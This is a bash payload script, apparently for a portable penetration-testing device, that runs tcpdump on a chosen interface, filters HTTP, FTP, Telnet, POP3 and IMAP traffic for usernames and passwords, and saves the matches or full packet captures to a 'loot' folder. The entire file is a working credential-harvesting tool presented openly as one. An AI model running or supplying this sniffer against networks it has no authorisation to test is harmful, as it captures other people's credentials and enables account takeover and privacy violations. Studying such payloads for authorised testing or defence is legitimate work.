#!/bin/bash
# Title: Credential Sniffer
# Author: NullSec
# Description: Passive credential sniffing with tcpdump
# Category: nullsec/recon

LOOT_DIR="/mmc/nullsec/creds"
mkdir -p "$LOOT_DIR"

PROMPT "CREDENTIAL SNIFFER

Passive sniffing for
cleartext credentials.

Modes:
- HTTP forms/basic auth
- FTP credentials
- All cleartext
- Full packet capture

Press OK to configure."

# Find best interface
IFACE=""
for i in br-lan eth0 wlan1mon wlan0; do
    [ -d "/sys/class/net/$i" ] && IFACE=$i && break
done
[ -z "$IFACE" ] && { ERROR_DIALOG "No interface found!"; exit 1; }

PROMPT "SNIFFING MODE:

1. HTTP credentials
2. FTP credentials
3. All cleartext passwords
4. Full packet capture

Interface: $IFACE
Select mode next."

MODE=$(NUMBER_PICKER "Mode (1-4):" 3)
case $? in $DUCKYSCRIPT_CANCELLED|$DUCKYSCRIPT_REJECTED) MODE=3 ;; esac

DURATION=$(NUMBER_PICKER "Duration (seconds):" 120)
case $? in $DUCKYSCRIPT_CANCELLED|$DUCKYSCRIPT_REJECTED) DURATION=120 ;; esac

resp=$(CONFIRMATION_DIALOG "START SNIFFING?

Interface: $IFACE
Mode: $MODE
Duration: ${DURATION}s

Press OK to start.")
[ "$resp" != "$DUCKYSCRIPT_USER_CONFIRMED" ] && exit 0

TIMESTAMP=$(date +%Y%m%d_%H%M)
LOG_FILE="$LOOT_DIR/sniff_$TIMESTAMP.log"
PCAP_FILE="$LOOT_DIR/capture_$TIMESTAMP.pcap"

LOG "Sniffing on $IFACE..."

case $MODE in
    1) timeout $DURATION tcpdump -i "$IFACE" -A -s 0 'tcp port 80' 2>/dev/null | grep -iE 'user|pass|login|email|auth' > "$LOG_FILE" & ;;
    2) timeout $DURATION tcpdump -i "$IFACE" -A -s 0 'tcp port 21' 2>/dev/null | grep -iE '^USER|^PASS' > "$LOG_FILE" & ;;
    3) timeout $DURATION tcpdump -i "$IFACE" -A -s 0 'tcp port 21 or tcp port 23 or tcp port 80 or tcp port 110 or tcp port 143' 2>/dev/null | grep -iE 'user|pass|login|auth|credential' > "$LOG_FILE" & ;;
    4) timeout $DURATION tcpdump -i "$IFACE" -w "$PCAP_FILE" -s 0 2>/dev/null & ;;
esac

wait $!

CRED_COUNT=0
[ -f "$LOG_FILE" ] && CRED_COUNT=$(wc -l < "$LOG_FILE" | tr -d ' ')

PROMPT "SNIFFING COMPLETE

Duration: ${DURATION}s
Lines captured: $CRED_COUNT
Log: $LOG_FILE
$([ -f "$PCAP_FILE" ] && echo "PCAP: $PCAP_FILE")

Press OK to exit."
